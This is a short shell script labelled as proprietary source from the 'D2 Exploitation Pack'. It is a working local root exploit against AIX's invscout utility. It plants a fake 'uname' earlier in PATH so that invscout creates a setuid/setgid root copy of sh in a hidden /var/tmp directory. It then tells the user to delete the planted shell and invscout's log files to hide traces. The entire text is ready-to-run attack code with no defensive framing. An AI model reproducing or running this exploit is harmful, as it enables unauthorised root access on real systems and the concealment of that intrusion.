#!/bin/sh

# Proprietary D2 Exploitation Pack source code - use only under the license
# agreement specified in LICENSE.txt in your D2 Exploitation Pack
#
# Copyright DSquare Security, LLC, 2007-2008

MKDIR="/usr/bin/mkdir"
TMP="/var/tmp/.b$$"
EXSH="$TMP/sh"
RM="/bin/rm"

$MKDIR $TMP

/usr/bin/cp sh $EXSH
cd $TMP
cat > uname << EOF
#!/bin/sh
chown root:system $EXSH
chmod 755 $EXSH
chmod u+s $EXSH
chmod g+s $EXSH
EOF
chmod +x uname

PATH=$TMP:$PATH
export PATH

/usr/sbin/invscout &
sleep 10

echo 
echo "[!] run $EXSH and then delete :"
echo "   - $EXSH"
echo "   - /var/adm/invscout/localhost.mup"
echo "   - /var/adm/invscout/invs.mrp"
echo
